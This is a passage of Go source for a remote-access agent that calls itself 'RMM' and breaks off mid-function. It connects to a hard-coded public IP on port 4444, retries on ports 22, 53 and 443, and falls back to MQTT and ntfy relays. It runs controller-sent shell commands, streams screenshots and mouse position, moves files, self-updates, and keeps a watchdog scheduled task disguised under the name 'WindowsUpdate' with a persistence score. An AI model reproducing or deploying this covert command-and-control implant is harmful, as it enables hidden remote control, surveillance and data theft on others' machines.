package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"hash/fnv"
	"image"
	"image/jpeg"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"rmm/internal/commands"
	"rmm/internal/mqttrelay"
	"rmm/internal/protocol"
	"rmm/internal/relay"
	"rmm/internal/version"
)

// captureImage captures a display. quality<=0 means PNG (lossless, desktop
// default); quality 1-100 means JPEG (a 1920x1080 frame drops from ~180KB
// PNG to ~40-80KB JPEG at q70). all=true captures the full virtual screen
// across every monitor (dual view); otherwise monitor selects the display
// halveRGBA downscales RGBA by 2x2 box average (dependency-free): half
// width/height = quarter pixels = ~4x smaller JPEGs for relay links.
func halveRGBA(src *image.RGBA) *image.RGBA {
	b := src.Bounds()
	w, h := b.Dx()/2, b.Dy()/2
	if w < 1 {
		w = 1
	}
	if h < 1 {
		h = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, w, h))
	maxX, maxY := b.Min.X+b.Dx()-1, b.Min.Y+b.Dy()-1
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			var r, g, bl, a uint32
			for dy := 0; dy < 2; dy++ {
				for dx := 0; dx < 2; dx++ {
					sx := b.Min.X + x*2 + dx
					if sx > maxX {
						sx = maxX
					}
					sy := b.Min.Y + y*2 + dy
					if sy > maxY {
						sy = maxY
					}
					i := src.PixOffset(sx, sy)
					r += uint32(src.Pix[i])
					g += uint32(src.Pix[i+1])
					bl += uint32(src.Pix[i+2])
					a += uint32(src.Pix[i+3])
				}
			}
			i := dst.PixOffset(x, y)
			dst.Pix[i] = uint8(r / 4)
			dst.Pix[i+1] = uint8(g / 4)
			dst.Pix[i+2] = uint8(bl / 4)
			dst.Pix[i+3] = uint8(a / 4)
		}
	}
	return dst
}

// encodeImage compresses one frame/tile: JPEG at quality, PNG when quality<=0.
func encodeImage(img image.Image, quality int) (data []byte, format string, err error) {
	var buf bytes.Buffer
	if quality > 0 {
		if quality > 100 {
			quality = 100
		}
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
			return nil, "", err
		}
		return buf.Bytes(), "jpeg", nil
	}
	if err := png.Encode(&buf, img); err != nil {
		return nil, "", err
	}
	return buf.Bytes(), "png", nil
}

// index (out of range falls back to primary).
func captureRaw(monitor int, all bool, scale float64) (img *image.RGBA, w, h, ox, oy int, err error) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, 0, 0, 0, 0, fmt.Errorf("no displays")
	}
	bounds := screenshot.GetDisplayBounds(0)
	if all && n > 1 {
		minX, minY := bounds.Min.X, bounds.Min.Y
		maxX, maxY := bounds.Max.X, bounds.Max.Y
		for i := 1; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Min.X < minX {
				minX = b.Min.X
			}
			if b.Min.Y < minY {
				minY = b.Min.Y
			}
			if b.Max.X > maxX {
				maxX = b.Max.X
			}
			if b.Max.Y > maxY {
				maxY = b.Max.Y
			}
		}
		bounds = image.Rect(minX, minY, maxX, maxY)
	} else if monitor > 0 && monitor < n {
		bounds = screenshot.GetDisplayBounds(monitor)
	}
	cimg, cerr := screenshot.CaptureRect(bounds)
	if cerr != nil {
		return nil, 0, 0, 0, 0, cerr
	}
	img = cimg
	w, h = bounds.Dx(), bounds.Dy()
	ox, oy = bounds.Min.X, bounds.Min.Y
	if scale > 0 && scale < 1 {
		// Half detail for relay links: origin scales too so the UI's
		// pointer mapping stays in the same (scaled) space as w/h.
		img = halveRGBA(img)
		w /= 2
		h /= 2
		ox /= 2
		oy /= 2
	}
	return img, w, h, ox, oy, nil
}

// captureImage is captureRaw + encode (full frames; tile path below uses
// captureRaw directly so it can compare pre-encode pixels).
func captureImage(quality, monitor int, all bool, scale float64) (data []byte, w, h, ox, oy int, format string, err error) {
	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
	if err != nil {
		return nil, 0, 0, 0, 0, "", err
	}
	data, format, err = encodeImage(img, quality)
	if err != nil {
		return nil, 0, 0, 0, 0, "", err
	}
	return data, w, h, ox, oy, format, nil
}

func captureScreen() ([]byte, int, int, error) {
	data, w, h, _, _, _, err := captureImage(0, 0, false, 0)
	return data, w, h, err
}

// Tile-diff streaming: desktop screens are ~95% static between frames, so
// only changed 128px tiles are sent (each a small JPEG), plus a full
// keyframe every tileKeyframeEvery generations to heal any desync. Static
// screen = near-zero bytes; full motion degrades gracefully to keyframes.
const tileSize = 128
const tileKeyframeEvery = 30

type tileCache struct {
	key string // dims+scale+monitor+all: any change forces a keyframe
	w, h int
	stride int // row bytes of pix (RGBA stride, not assumed == w*4)
	pix  []byte // last-sent RGBA pixels
	gen  uint64
}

var tileMu sync.Mutex
var tileCur *tileCache

func hashTile(pix []byte, stride, x, y, tw, th int) uint64 {
	h := fnv.New64a()
	for row := 0; row < th; row++ {
		off := (y+row)*stride + x*4
		h.Write(pix[off : off+tw*4])
	}
	return h.Sum64()
}

// diffRects compares two same-stride RGBA buffers tile by tile, returning
// changed tile rects [x,y,w,h] and the changed-pixel ratio. Pure function:
// the unit-tested core of tile-diff streaming.
func diffRects(cur, prev []byte, stride, w, h int) (changed [][4]int, ratio float64) {
	nx, ny := (w+tileSize-1)/tileSize, (h+tileSize-1)/tileSize
	for ty := 0; ty < ny; ty++ {
		for tx := 0; tx < nx; tx++ {
			x, y := tx*tileSize, ty*tileSize
			tw, th := tileSize, tileSize
			if x+tw > w {
				tw = w - x
			}
			if y+th > h {
				th = h - y
			}
			if hashTile(cur, stride, x, y, tw, th) != hashTile(prev, stride, x, y, tw, th) {
				changed = append(changed, [4]int{x, y, tw, th})
			}
		}
	}
	if w*h == 0 {
		return changed, 0
	}
	return changed, float64(len(changed)*tileSize*tileSize) / float64(w*h)
}

// captureTiled captures and diffs against the last-sent frame, returning
// ready-to-publish messages: one TypeScreen keyframe, or zero+ TypeTile
// (same FSeq generation). Zero tiles = single empty TypeScreen heartbeat so
// the UI knows the stream is alive with nothing changed. (nil, nil) means
// superseded mid-capture: a newer frame already published, drop silently.
func captureTiled(quality, monitor int, all bool, scale float64) (msgs []protocol.Message, err error) {
	s0 := frameSeq.Load()
	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
	if err != nil {
		return nil, err
	}
	if frameSeq.Load() != s0 {
		return nil, nil // superseded during capture; UI would drop this frame
	}
	key := fmt.Sprintf("%dx%d/s%v/m%d/a%v", w, h, scale, monitor, all)
	tq := quality
	if tq <= 0 {
		tq = 70 // tiles are a streaming path: JPEG even if full frames use PNG
	}
	tileMu.Lock()
	defer tileMu.Unlock()
	keyframe := tileCur == nil || tileCur.key != key || tileCur.w != w || tileCur.h != h || tileCur.stride != img.Stride || (tileCur.gen+1)%tileKeyframeEvery == 1
	cur := img.Pix
	gen := nextFrameSeq()
	if !keyframe {
		ch, ratio := diffRects(cur, tileCur.pix, img.Stride, w, h)
		if len(ch) == 0 {
			tileCur.gen = gen
			return []protocol.Message{{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, FSeq: gen}}, nil
		}
		if ratio < 0.7 {
			// Changed region is small: send tiles. (SubImage rect is in
			// image space: offset by Bounds Min for multi-monitor captures.)
			mn := img.Bounds().Min
			cp := append([]byte(nil), cur...)
			for _, c := range ch {
				sub := img.SubImage(image.Rect(mn.X+c[0], mn.Y+c[1], mn.X+c[0]+c[2], mn.Y+c[1]+c[3]))
				data, _, err := encodeImage(sub, tq)
				if err != nil {
					return nil, err
				}
				msgs = append(msgs, protocol.Message{Type: protocol.TypeTile, Width: c[2], Height: c[3], OX: ox + c[0], OY: oy + c[1], Data: base64.StdEncoding.EncodeToString(data), Format: "jpeg", FSeq: gen})
			}
			tileCur.pix = cp
			tileCur.gen = gen
			return msgs, nil
		}
		keyframe = true // most of the frame changed: keyframe is cheaper
	}
	data, format, err := encodeImage(img, quality)
	if err != nil {
		return nil, err
	}
	tileCur = &tileCache{key: key, w: w, h: h, stride: img.Stride, pix: append([]byte(nil), cur...), gen: gen}
	return []protocol.Message{{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: base64.StdEncoding.EncodeToString(data), Format: format, FSeq: gen}}, nil
}

func runCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}
	// Limit output to 1MB to avoid blowing scanner buffer
	out, err := cmd.CombinedOutput()
	if len(out) > 1024*1024 {
		out = out[:1024*1024]
	}
	if err != nil {
		// Still return output; include error
		return string(out), err.Error()
	}
	return string(out), ""
}

// splitCmd parses "cmd args..." into name + args.
func splitCmd(cmdStr string) (string, string) {
	cmdName := strings.TrimSpace(cmdStr)
	args := ""
	if idx := strings.Index(cmdName, " "); idx != -1 {
		args = strings.TrimSpace(cmdName[idx+1:])
		cmdName = strings.TrimSpace(cmdName[:idx])
	}
	return cmdName, args
}

// isKillCmd reports whether cmdStr asks the agent process to terminate.
// kill-agent is intercepted in agent main on every transport (direct, ntfy,
// MQTT) before commands.Execute ever sees it.
func isKillCmd(cmdStr string) bool {
	name, _ := splitCmd(cmdStr)
	switch strings.ToLower(name) {
	case "kill-agent", "agent-kill", "agent-exit":
		return true
	}
	return false
}

// exitSoon terminates the agent process after a short grace period so the
// goodbye output still flushes. It also disables the watchdog scheduled
// task, otherwise the 5-minute repetition would resurrect the process and
// kill-agent could never stay dead. Reinstalling / manual start re-enables.
func exitSoon(via string) {
	log.Printf("[*] kill-agent (%s) — exiting process", via)
	go func() {
		time.Sleep(800 * time.Millisecond)
		if runtime.GOOS == "windows" {
			c := exec.Command("schtasks", "/change", "/TN", "WindowsUpdate", "/DISABLE")
			if out, err := c.CombinedOutput(); err != nil {
				log.Printf("[!] disable watchdog task: %v %s", err, strings.TrimSpace(string(out)))
			} else {
				log.Printf("[*] watchdog task disabled (reinstall re-enables)")
			}
		}
		os.Exit(0)
	}()
}

// fileDlStream answers one download request by streaming file chunks via
// send (transport-specific). Out-of-order arrival is fine: the UI
// reassembles by seq and re-requests gaps from the first missing seq.
func fileDlStream(path string, fromSeq, chunkRaw int, send func(protocol.Message) error) {
	if chunkRaw <= 0 {
		chunkRaw = 512 * 1024
	}
	// Directories auto-zip (deterministic temp file, removed after).
	realPath, displayName, cleanup, err := commands.ResolveDlSource(path)
	if err != nil {
		_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, Error: err.Error()})
		return
	}
	if cleanup {
		defer os.Remove(realPath)
	}
	man, err := commands.FileDlManifest(realPath, chunkRaw)
	if err != nil {
		_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, Error: err.Error()})
		return
	}
	log.Printf("[*] File download %s (%s, %d bytes, %d chunks from %d)", path, displayName, man.Size, man.Total, fromSeq)
	for seq := fromSeq; seq < man.Total; seq++ {
		data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
		if err != nil {
			_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
			return
		}
		if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
			log.Printf("[!] file-dl send: %v", err)
			return
		}
	}
}

// updateOutput builds an output message from a result/error pair (shared
// by the self-update handlers on every transport).
func updateOutput(res string, err error) protocol.Message {
	if err != nil {
		if res == "" {
			return protocol.Message{Type: protocol.TypeOutput, Result: err.Error()}
		}
		return protocol.Message{Type: protocol.TypeOutput, Result: res, Error: err.Error()}
	}
	return protocol.Message{Type: protocol.TypeOutput, Result: res}
}

// execCommand runs a command string and builds the output message.
// maxBytes caps the result (direct TLS allows 1MB, relays less).
// A duplicate id (two controllers, same command) returns suppressed.
func execCommand(cmdStr, cmdID string, maxBytes int, truncNote string) (protocol.Message, bool) {
	t := time.Now()
	cmdName, args := splitCmd(cmdStr)
	result, suppressed, err := commands.ExecuteChecked(cmdID, cmdName, args)
	if suppressed {
		log.Printf("[*] Duplicate %s suppressed", cmdID)
		return protocol.Message{}, true
	}
	dlog.Printf("[cmd] %q took %dms err=%v", cmdName, time.Since(t).Milliseconds(), err)
	errStr := ""
	if err != nil {
		errStr = err.Error()
		if result == "" {
			result = errStr
			errStr = ""
		}
	}
	if len(result) > maxBytes {
		result = result[:maxBytes] + truncNote
	}
	return protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: cmdID}, false
}

func mustJSON(v interface{}) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func nowMillis() int64 { return time.Now().UnixMilli() }

// frameSeq numbers captures in completion order across all transports so
// the UI can drop stale arrivals when pipelining requests.
var frameSeq atomic.Uint64

func nextFrameSeq() uint64 { return frameSeq.Add(1) }

// instanceID stably identifies this agent process (hostname-pid) so the
// controller can tell two processes on one host apart.
func instanceID() string {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	return fmt.Sprintf("%s-%d", hn, os.Getpid())
}

// rollbackNotice, when non-nil, reports a watchdog-executed rollback of a
// crash-looping update. Attached to every hello so the controller alarms
// and holds back the bad version.
var rollbackNotice *commands.RollbackNotice

// helloMsg builds the TypeConnect announcement, carrying any rollback report.
func helloMsg(hn, user string) protocol.Message {
	layers, alarm := readProtection()
	m := protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID(), Version: version.DesktopAgentVersion, Auth: commands.AgentToken(), Prot: layers, ProtDetail: alarm}
	if rollbackNotice != nil {
		m.RollbackBad = rollbackNotice.Bad
		m.RollbackTo = rollbackNotice.To
	}
	return m
}

// readProtection returns the watcher's persistence-layer score ("5/6")
// plus any sticky tamper tripwire. Empty score = unknown (watcher not yet
// run or old install).
func readProtection() (string, string) {
	dir := filepath.Join(os.TempDir(), "RMM")
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	}
	b, err := os.ReadFile(filepath.Join(dir, "protection.json"))
	if err != nil {
		return "", ""
	}
	var p struct {
		Layers string `json:"layers"`
		Alarm  string `json:"alarm"`
	}
	if json.Unmarshal(b, &p) != nil {
		return "", ""
	}
	return p.Layers, p.Alarm
}

// noteAck consumes the rollback notice once the controller acks it, so the
// report survives controller restarts (re-sent on every hello) without
// repeating forever after it lands.
func noteAck(msg protocol.Message) {
	if msg.RollbackAck && rollbackNotice != nil {
		log.Printf("[*] Controller acked rollback report, clearing notice")
		commands.ConsumeRollbackNotice()
		rollbackNotice = nil
	}
}

func hostnameAndUser() (string, string) {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	if user == "" {
		user = "unknown"
	}
	return hn, user
}

type agent struct {
	controllerAddr string
	caFile         string
	insecure       bool
	screenshotFPS  float64
	conn           net.Conn
	enc            *json.Encoder
	mu             sync.Mutex
	closing        chan struct{}
	// quietUntil (UnixNano) pauses reconnects after the user ends the
	// session from the controller. The service keeps running; it just
	// stays quiet instead of instantly reappearing. Never touches the PC.
	quietUntil atomic.Int64
}

// disconnectQuiet is how long the agent stays quiet after a user disconnect.
const disconnectQuiet = 5 * time.Minute

func (a *agent) setQuiet(d time.Duration) {
	a.quietUntil.Store(time.Now().Add(d).UnixNano())
	log.Printf("[*] Session ended by controller — staying quiet for %s (service keeps running, PC untouched)", d)
}

func (a *agent) quietRemain() time.Duration {
	rem := time.Until(time.Unix(0, a.quietUntil.Load()))
	if rem < 0 {
		return 0
	}
	return rem
}

func (a *agent) send(msg protocol.Message) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.enc == nil {
		return fmt.Errorf("no connection")
	}
	return a.enc.Encode(msg)
}

// defaultHouses preserves the historical HouseA/HouseB behavior when no
// houses.txt exists next to the exe.
var defaultHouses = []string{"176.229.98.54:4444", "192.168.68.57:4444"}

// parseHouseLines reads host:port lines (# comments + blanks skipped;
// bare host gets :4444).
func parseHouseLines(s string) []string {
	var out []string
	for _, ln := range strings.Split(s, "\n") {
		ln = strings.TrimSpace(strings.TrimSpace(ln))
		if ln == "" || strings.HasPrefix(ln, "#") {
			continue
		}
		if !strings.Contains(ln, ":") {
			ln += ":4444"
		}
		out = append(out, ln)
	}
	return out
}

// loadHouses returns the controller houses to roam across: houses.txt next
// to the exe (then CWD), else the compiled-in defaults. Re-read on every
// reconnect so editing the file needs no restart.
func loadHouses() []string {
	var houses []string
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "houses.txt")); err == nil {
			houses = append(houses, parseHouseLines(string(b))...)
		}
	}
	if b, err := os.ReadFile("houses.txt"); err == nil {
		houses = append(houses, parseHouseLines(string(b))...)
	}
	if len(houses) == 0 {
		return append([]string(nil), defaultHouses...)
	}
	seen := map[string]bool{}
	var uniq []string
	for _, h := range houses {
		if !seen[h] {
			seen[h] = true
			uniq = append(uniq, h)
		}
	}
	return uniq
}

// dialAddrs returns primary + per-house fallbacks on already-open ports
// (22,53,443,4444), so one agent install roams every reachable house.
func dialAddrs(primary string, houses []string) []string {
	var addrsToTry []string
	addrsToTry = append(addrsToTry, primary)
	for _, h := range houses {
		host, port, err := net.SplitHostPort(h)
		if err != nil {
			host, port = h, "4444"
		}
		addrsToTry = append(addrsToTry, net.JoinHostPort(host, port))
		for _, p := range []string{"4444", "443", "22", "53"} {
			if p == port {
				continue
			}
			addrsToTry = append(addrsToTry, net.JoinHostPort(host, p))
		}
	}
	addrsToTry = append(addrsToTry, "127.0.0.1:4444", "127.0.0.1:443")
	seen := map[string]bool{}
	var uniq []string
	for _, addr := range addrsToTry {
		if !seen[addr] {
			seen[addr] = true
			uniq = append(uniq, addr)
		}
	}
	return uniq
}

type dialResult struct {
	conn net.Conn
	addr string
}

// lastGoodPath caches the winning dial address next to the exe.
func lastGoodPath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "lastgood.txt")
	}
	return filepath.Join(os.TempDir(), "lastgood.txt")
}

func loadLastGood() string {
	b, err := os.ReadFile(lastGoodPath())
	if err != nil {
		return ""
	}
	if lg := strings.TrimSpace(strings.Split(string(b), "\n")[0]); lg != "" {
		return lg
	}
	return ""
}

func saveLastGood(addr string) {
	_ = os.WriteFile(lastGoodPath(), []byte(addr+"\n"), 0644)
}

// raceDials dials every candidate concurrently; the first success wins and
// losers are closed. Returns the winning conn + addr, or the last error
// when every dial failed.
func raceDials(addrs []string, baseCfg *tls.Config, insecure bool, caFile string) (net.Conn, string, error) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	winCh := make(chan dialResult, 1)
	doneCh := make(chan struct{})
	var mu sync.Mutex
	pending := len(addrs)
	var lastErr error
	tryWin := func(conn net.Conn, addr string) {
		select {
		case winCh <- dialResult{conn, addr}:
		default:
			conn.Close() // lost the race
		}
	}
	for _, addr := range addrs {
		go func(addr string) {
			useCfg := baseCfg
			if strings.Contains(addr, "192.168.") && !insecure {
				clone := baseCfg.Clone()
				clone.InsecureSkipVerify = true
				useCfg = clone
			}
			td := &tls.Dialer{NetDialer: dialer, Config: useCfg}
			conn, err := td.DialContext(ctx, "tcp", addr)
			mu.Lock()
			defer mu.Unlock()
			if err != nil {
				log.Printf("[!] Dial %s failed: %v", addr, err)
				lastErr = err
			} else {
				tryWin(conn, addr)
			}
			if pending--; pending == 0 {
				close(doneCh)
			}
		}(addr)
	}
	select {
	case w := <-winCh:
		return w.conn, w.addr, nil
	case <-doneCh:
		mu.Lock()
		defer mu.Unlock()
		if lastErr == nil {
			lastErr = fmt.Errorf("no dial candidates")
		}
		return nil, "", lastErr
	}
}

func (a *agent) connectOnce() error {
	var tlsCfg *tls.Config
	if a.insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(a.caFile)
		if err != nil {
			return fmt.Errorf("read ca %s: %w", a.caFile, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			return fmt.Errorf("failed to parse CA cert %s", a.caFile)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}

	// Last-good first: the winner of the previous race dials first, so a
	// stable setup reconnects in ~one RTT instead of re-racing everything.
	uniqAddrs := dialAddrs(a.controllerAddr, loadHouses())
	if lg := loadLastGood(); lg != "" {
		uniqAddrs = append([]string{lg}, uniqAddrs...)
		seen := map[string]bool{}
		dedup := uniqAddrs[:0]
		for _, x := range uniqAddrs {
			if !seen[x] {
				seen[x] = true
				dedup = append(dedup, x)
			}
		}
		uniqAddrs = dedup
	}
	// Happy-eyeballs race: dial every candidate concurrently, first success
	// wins. Worst case is one timeout (~5s), not the sum of all of them.
	conn, dialAddr, dialErr := raceDials(uniqAddrs, tlsCfg, a.insecure, a.caFile)
	var err error
	if dialErr == nil {
		log.Printf("[+] Connected to %s", dialAddr)
		a.controllerAddr = dialAddr
		saveLastGood(dialAddr)
		err = nil
	} else {
		log.Printf("[!] All direct dials failed: %v", dialErr)
		err = dialErr
	}
	// MQTT relay (persistent outbound TCP, zero polling) before ntfy.
	if err != nil {
		log.Printf("[*] All direct dials failed, trying MQTT relay...")
		if merr := a.connectViaMQTT(); merr != nil {
			log.Printf("[!] MQTT failed: %v", merr)
			err = merr
		} else {
			return nil // connectViaMQTT only returns on shutdown
		}
	}
	// Ntfy relay final fallback (only our app, no open port, just HTTPS out)
	if err != nil {
		log.Printf("[*] All direct dials failed, trying ntfy relay %s...", relay.NtfyTopic)
		return a.connectViaNtfy()
	}
	if err != nil {
		return err
	}
	a.conn = conn
	a.enc = json.NewEncoder(conn)
	log.Printf("[+] Connected to %s", a.controllerAddr)

	// Send connect
	hn, user := hostnameAndUser()
	if err := a.send(helloMsg(hn, user)); err != nil {
		conn.Close()
		return fmt.Errorf("send connect: %w", err)
	}

	// Channels
	done := make(chan struct{})
	errCh := make(chan error, 1)

	// Reader
	go func() {
		defer close(done)
		scanner := bufio.NewScanner(conn)
		buf := make([]byte, 64*1024)
		scanner.Buffer(buf, 2*1024*1024) // commands are small; screen requests are tiny
		for scanner.Scan() {
			line := scanner.Bytes()
			if len(line) == 0 {
				continue
			}
			var msg protocol.Message
			if err := json.Unmarshal(line, &msg); err != nil {
				log.Printf("[!] bad json: %v raw=%.200s", err, string(line))
				continue
			}
			switch msg.Type {
			case protocol.TypeConnected:
				noteAck(msg)
				log.Printf("[+] Controller acknowledged id=%s", msg.ID)
			case protocol.TypeUpdateBegin:
				log.Printf("[*] Update begin %s (%d bytes, %d chunks)", msg.UpdateVer, msg.UpdateSize, msg.UpdateTotal)
				go func(m protocol.Message) {
					res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip)
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeUpdateChunk:
				go func(m protocol.Message) {
					res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
					if res == "" && err == nil {
						return
					}
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeFileDlReq:
				go func(m protocol.Message) {
					fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, a.send)
				}(msg)
			case protocol.TypeFileUlBegin:
				go func(m protocol.Message) {
					res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeFileUlChunk:
				go func(m protocol.Message) {
					res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
					if res == "" && err == nil {
						return
					}
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeCommand:
				log.Printf("[*] Command: %s", msg.Cmd)
				go func(m protocol.Message) {
					cmdStr := m.Cmd
					if isKillCmd(cmdStr) {
						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
						exitSoon("direct")
						return
					}
					// Parse into cmd + args (first space split, keep rest)
					cmdName := strings.TrimSpace(cmdStr)
					args := ""
					if idx := strings.Index(cmdName, " "); idx != -1 {
						args = strings.TrimSpace(cmdName[idx+1:])
						cmdName = strings.TrimSpace(cmdName[:idx])
					}
					// Dedupe: a second controller may deliver the same command.
					// (ExecuteChecked runs it only on first sight.)
				result, suppressed, err := commands.ExecuteChecked(m.CmdID, cmdName, args)
				if suppressed {
					log.Printf("[*] Duplicate %s suppressed", m.CmdID)
					_ = a.send(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
					return
				}
					errStr := ""
					if err != nil {
						errStr = err.Error()
						// If handler returned error but also result, keep result
						if result == "" {
							result = errStr
							errStr = ""
						}
					}
					// Truncate if needed
					if len(result) > 1024*1024 {
						result = result[:1024*1024] + "\n... truncated"
					}
				resp := protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: m.CmdID}
				if err := a.send(resp); err != nil {
						log.Printf("[!] send output: %v", err)
					} else {
						log.Printf("[*] Sent output (%d bytes)", len(result))
					}
				}(msg)
			case protocol.TypeScreenshotRequest:
			log.Printf("[*] Screenshot requested (quality=%d monitor=%d all=%v scale=%v)", msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale)
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						log.Printf("[!] capture: %v", err)
						_ = a.send(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						if err := a.send(m); err != nil {
							log.Printf("[!] send screen: %v", err)
							return
						}
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
					if err != nil {
						log.Printf("[!] capture: %v", err)
						_ = a.send(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					if frameSeq.Load() != s0 {
						log.Printf("[*] screenshot superseded, dropping")
						return // a newer frame already published; UI would drop this one
					}
					b64 := base64.StdEncoding.EncodeToString(data)
					log.Printf("[*] Captured %dx%d+%d+%d %s %d bytes -> %d b64", w, h, ox, oy, format, len(data), len(b64))
					if err := a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()}); err != nil {
						log.Printf("[!] send screen: %v", err)
					}
				}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
			case protocol.TypePing:
				_ = a.send(protocol.Message{Type: protocol.TypePong})
			case protocol.TypePong:
				// ignore
			case protocol.TypeDisconnect:
				// User ended the session from the controller. Go quiet for
				// a while, then resume. Never touches the PC itself.
				a.setQuiet(disconnectQuiet)
				conn.Close()
				return
			default:
				log.Printf("[*] Unknown msg type=%s", msg.Type)
			}
		}
		if err := scanner.Err(); err != nil {
			errCh <- err
		} else {
			errCh <- fmt.Errorf("connection closed")
		}
	}()

	// Periodic tasks
	var mouseTicker *time.Ticker
	var screenTicker *time.Ticker
	var mouseCh <-chan time.Time
	var screenCh <-chan time.Time

	if a.screenshotFPS > 0 {
		interval := time.Duration(float64(time.Second) / a.screenshotFPS)
		if interval < 100*time.Millisecond {
			interval = 100 * time.Millisecond
		}
		screenTicker = time.NewTicker(interval)
		screenCh = screenTicker.C
		log.Printf("[*] Periodic screenshots every %v", interval)
	}
	// Mouse every 120ms (direct path is cheap; unchanged events still deduped)
	mouseTicker = time.NewTicker(120 * time.Millisecond)
	mouseCh = mouseTicker.C
	defer func() {
		if mouseTicker != nil {
			mouseTicker.Stop()
		}
		if screenTicker != nil {
			screenTicker.Stop()
		}
	}()

	lastX, lastY := -1, -1

	// Heartbeat ping every 30s
	pingTicker := time.NewTicker(30 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-a.closing:
			log.Printf("[*] Closing requested")
			conn.Close()
			return nil
		case <-done:
			select {
			case err := <-errCh:
				return err
			default:
				return fmt.Errorf("reader done")
			}
		case <-mouseCh:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			// Don't block on send
			_ = a.send(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y, Buttons: []int{0, 0, 0}})
		case <-screenCh:
			go func() {
				data, w, h, ox, oy, format, err := captureImage(0, 0, false, 0)
				if err != nil {
					return
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				_ = a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()})
			}()
		case <-pingTicker.C:
			_ = a.send(protocol.Message{Type: protocol.TypePing})
		}
	}
}

func (a *agent) connectViaNtfy() error {
	hn, user := hostnameAndUser()
	me := "agent:" + hn
	relaySessionActive.Store(true)
	defer relaySessionActive.Store(false)
	// E2E key for relay payloads (best effort; plaintext fallback keeps
	// old controllers working). Sent with every announce for rotation.
	if _, err := commands.E2EInitControllerKey(a.caFile); err == nil {
		log.Printf("[*] E2E key ready for relay payloads")
	} else {
		log.Printf("[*] E2E unavailable (%v), relay payloads stay plaintext", err)
	}
	announce := func() {
		_ = relay.PublishTo(me, "controller", helloMsg(hn, user))
		if wrapped, ok := commands.E2EWrapped(); ok {
